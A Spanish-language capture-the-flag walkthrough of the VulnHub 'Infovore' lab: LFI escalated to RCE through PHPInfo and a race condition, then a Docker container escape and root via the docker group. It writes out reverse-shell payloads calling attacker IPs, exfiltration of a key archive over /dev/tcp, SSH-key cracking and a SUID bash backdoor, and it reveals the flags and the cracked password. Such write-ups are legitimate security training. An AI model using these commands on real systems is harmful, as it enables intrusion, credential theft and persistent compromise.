---
tags:
  - CTF
  - estado/completo
plataforma: "[[VulnHub]]"
web: https://www.vulnhub.com/infovore
dificultad: Media
os: Linux
relacionados:
  - "[[Race Condition]]"
  - "[[LFI]]"
  - "[[LFI2RCE]]"
  - "[[docker]]"
  - "[[Password Reuse]]"
  - "[[Docker Escape]]"
  - "[[Boundary]]"
---
#  VulnHub - Infovore

## Reconocimiento

### Escaneo de Puertos
#### TCP (Servicios Activos)
```bash
rustscan -a 192.168.2.141 --ulimit 5000 -g
nmap -p80 -sCV 192.168.2.141 -oN tcpScan
```
**Hallazgos**:
- `Puerto 80/http`: Apache 2.4.38 + PHP 7.4.7

#### UDP (Resultados Relevantes)
```bash
nmap -sU --top-ports 1500 --min-rate 5000 192.168.2.141
```
- Sin puertos UDP críticos abiertos.

---

## Enumeración Web
### Tecnologías Detectadas
```bash
whatweb http://192.168.2.141
```
- **PHP 7.4.7** con `file_uploads=On` (vía `info.php`).

### Directorios Críticos

```bash
gobuster dir -u http://192.168.2.141 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
- `info.php`: Expone configuración PHP (¡clave para RCE!).

---

## Análisis de Vulnerabilidades
### Local File Inclusion (LFI)

- **Parámetro Vulnerable**: `filename` (ejemplo: `/?filename=/etc/passwd`).
- **Limitaciones**: Wrappers comunes bloqueados, logs no accesibles.

### LFI → RCE via PHPInfo() + Race Condition

1. **Detectar `file_uploads=On` en `info.php`**.
2. **Explotar subida temporal de archivos** combinando:
   - **PHPInfo()**: Para obtener offsets de archivos temporales.
   - **Race Condition**: Acceder al archivo antes de su eliminación.

### Prueba del file upload

Para forzar la subida de archivos temporales, construimos una petición multipart/form-data:
```
Content-Type: multipart/form-data; boundary=--prueba

----prueba
Content-Disposition: form-data; name="file"; filename="file.txt"
Content-Type: text/plain

Hola esto es una prueba

----prueba
```

Busco por `tmp_name` y veo que cargó el `file.txt`.

 Si lo cargo desde la web desde el LFI, no logro verlo porque este tipo de archivos duran muy poco en el sistema y son eliminados, ya que PHP necesita tener una configuración que le diga que el archivo se tiene que guardar en determinado lugar, sino se elimina . Por ende tengo que usar un [[Race Condition]].

---

## Explotación

### Ganar Acceso Inicial (RCE)

1. **Descargar script de explotación** [phpinfolfi.py](https://github.com/...).
2. **Configurar payload** (reverse shell):
   ```python
   # Modificar payload en el script
   payload = '<?php system("nc -e /bin/bash 192.168.2.137 4444"); ?>'
   ```
3. **Ejecuto el exploit**:
   ```bash
   python2.7 phpinfolfi.py 192.168.2.141
   ```
4. **Capturar shell** como `www-data`:
   ```bash
   nc -lvnp 4444
   ```

o

1. **Descargar script de explotación**: [phpinfo_lfi.py](https://github.com/mikaelkall/HackingAllTheThings/blob/master/lfi/phpinfo_lfi.py)
2. **Configurar payload**:
```php
# Borro el payload cargado y pongo el siguiente:
system("bash -c 'bash -i >& /dev/tcp/172.16.217.148/443 0>&1'");
```
3. **Ejecuto el exploit**:
```python
python2.7 phpinfo_lfi.py "http://172.16.217.155:80/info.php" "index.php?filename=" 172.16.217.155 443
```


---

## Post-Explotación
### Escape del Contenedor Docker

1. **Enumerar entorno**:
   ```bash
   hostname -I  # Muestra IPs: 192.168.150.21 (contenedor)
   ls -la /     # Revela .oldkeys.tgz
   ```
2. **Me mando el comprimido a mi equipo**:
	```bash
	cat .oldkeys.tgz > /dev/tcp/172.16.217.148/443 
	
	nc -nlvp 443 > oldkeys.tgz
	```
3. **Extraer claves SSH encriptadas**:
   ```bash
   tar -xvf .oldkeys.tgz  # Contiene clave DSA (root)
   ```
4. **Crackear clave con `ssh2john`**:
   ```bash
   ssh2john root > hash
   john --wordlist=rockyou.txt hash  # Password: choclate93
   ```
5. **Acceder como root en contenedor**:
   ```bash
   su root  # Usar contraseña crackeada
   ```

Con la clave obtenida me conecto dentro del contenedor como `root`, pero sigo estando dentro del contenedor. 

### Movimiento Lateral a la Máquina Host

1. **Encontrar clave RSA en `/root/.ssh`**:
   - **Crackear clave id_rsa** (misma contraseña: `choclate93`).
2. **SSH al host interno (192.168.150.1)**:
   ```bash
   ssh -i id_rsa admin@192.168.150.1
   ```

---

## Escalada de Privilegios (Docker Group)
### Abuso del Grupo Docker

1. **Verificar membresía**:
   ```bash
   id  # admin pertenece a grupo docker
   ```
Encuentro que tengo permisos del grupo `docker` lo que me permitiria crear nuevos contenedores y usando monturas podría montar la raíz de la maquina victima en una imagen del contenedor.
2. **Montar filesystem del host**:
   ```bash
   docker run -it -v /:/mnt/root alpine chroot /mnt/root
   ```
3. **Crear backdoor persistente**:
   ```bash
   chmod u+s /bin/bash  # Setear SUID en bash
   exit
   ```
4. **Obtener shell como root**:
   ```bash
   bash -p  # Ejecutar bash con privilegios SUID
   ```

o

2. **Montar filesystem del host**:
	```
	docker run -dit -v /:/mnt/privilege 40de379c5116
	```
	```
	docker exec -it nostalgic_turing bash
	```
	Ahora tengo una imagen con una nueva interface de red, que tiene montado toda la raiz del sistema base.
3. **Crear backdoor persistente**:
	Me dirijo a a `mnt/privilege`
	```
	chmod u+s bin/bash
	```

---

## Bandera(s)

> [!FLAG] `flag{Docker}`
> FLAG{Congrats_on_owning_phpinfo_hope_you_enjoyed_it}
^bandera

> [!FLAG] `flag{User}`
> FLAG{Escaped_from_D0ck3r}
^bandera

> [!FLAG] `flag{Root}`
FLAG{And_now_You_are_done}
^bandera